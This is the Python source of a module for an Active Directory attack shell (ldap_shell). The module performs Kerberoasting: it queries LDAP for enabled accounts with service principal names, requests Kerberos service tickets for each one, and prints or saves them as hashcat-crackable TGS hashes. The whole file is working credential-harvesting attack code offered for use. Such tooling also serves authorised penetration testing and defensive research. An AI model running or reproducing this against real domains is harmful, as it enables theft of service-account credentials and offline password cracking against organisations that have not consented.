import logging
from typing import Optional

from ldap3 import Connection
from ldapdomaindump import domainDumper
from pydantic import BaseModel

from ldap_shell.ldap_modules.base_module import ArgumentType, BaseLdapModule, arg_field
from ldap_shell.utils.ldap_utils import LdapUtils
from ldap_shell.utils.roast_utils import tgs_hash

ACCOUNTDISABLE = 2


class LdapShellModule(BaseLdapModule):
    """Find user accounts with an SPN (Kerberoastable)."""

    help_text = "Find Kerberoastable users and print hashcat TGS hashes"
    examples_text = """
    `get_kerberoast`
    `get_kerberoast sql.svc`
    `get_kerberoast sql.svc tgs.hashes`
    Inline: `ldap_shell domain.local/user:pass get_kerberoast`
    """
    module_type = "Get Info"

    class ModuleArgs(BaseModel):
        target: Optional[str] = arg_field(
            None,
            description="Optional sAMAccountName to check",
            arg_type=ArgumentType.USER,
        )
        output: Optional[str] = arg_field(
            None,
            description="Optional file to append hashcat hashes",
            arg_type=ArgumentType.STRING,
        )

    def __init__(self, args_dict: dict, domain_dumper: domainDumper, client: Connection, log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def __call__(self):
        search_filter = (
            f'(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)'
            f'(!(userAccountControl:1.2.840.113556.1.4.803:={ACCOUNTDISABLE})))'
        )
        if self.args.target:
            search_filter = f'(&{search_filter}{LdapUtils.sam_filter(self.args.target)})'

        self.client.search(
            self.domain_dumper.root,
            search_filter,
            attributes=['sAMAccountName', 'servicePrincipalName', 'distinguishedName'],
            paged_size=500,
        )
        if not self.client.entries:
            self.log.info('No Kerberoastable users found')
            return
        domain = LdapUtils.get_domain_name(self.domain_dumper.root)
        kdc = getattr(self.client.server, 'host', None)
        self.log.info(f'Found {len(self.client.entries)} Kerberoastable user(s):')
        dumped = []
        tgt_cache = None
        for entry in self.client.entries:
            sam = entry['sAMAccountName'].value
            spns = entry['servicePrincipalName'].values if 'servicePrincipalName' in entry else []
            self.log.info(f'  {sam}  {", ".join(spns)}')
            for spn in spns:
                try:
                    line, tgt_cache = tgs_hash(self.client, sam, domain, spn, kdc, tgt_cache)
                except Exception as exc:
                    self.log.warning(f'  TGS failed for {spn}: {exc}')
                    tgt_cache = None
                    continue
                self.log.info(line)
                dumped.append(line)
        if dumped and self.args.output:
            with open(self.args.output, 'a', encoding='utf-8') as handle:
                handle.write('\n'.join(dumped) + '\n')
            self.log.info(f'Wrote {len(dumped)} hash(es) to {self.args.output}')
